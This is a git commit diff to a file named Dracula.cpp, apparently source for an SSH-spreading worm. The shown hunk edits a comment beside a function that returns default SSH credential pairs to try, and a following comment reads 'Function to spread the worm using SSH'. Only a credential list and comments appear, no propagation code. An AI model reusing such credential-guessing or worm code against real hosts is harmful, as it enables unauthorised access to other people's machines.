ae079809ff82d43b575d016d364b58b5786c4993
apocalypse9949 <125962989+apocalypse9949@users.noreply.github.com>
2024-10-07 13:52:33 +0530

    Update Dracula.cpp

--- Dracula.cpp
+++ Dracula.cpp
@@ -43,7 +43,8 @@ public:
 
     // Function to return a list of SSH credentials to try
     std::vector<std::pair<std::string, std::string>> get_credentials() {
-        return {{"user", "user"}, {"root", "root"}, {"fadmin", "fadmin"}};  // Default credentials
+        return {{"user", "user"}, {"root", "root"}, {"fadmin", "fadmin"}};  // Default credentials but consider that a brute force or other techniques can unlock thi
+        //So i recommend using ac5t%hgr%f7hbgf*t^6!@cm(nnh)s
     }
 
     // Function to spread the worm using SSH
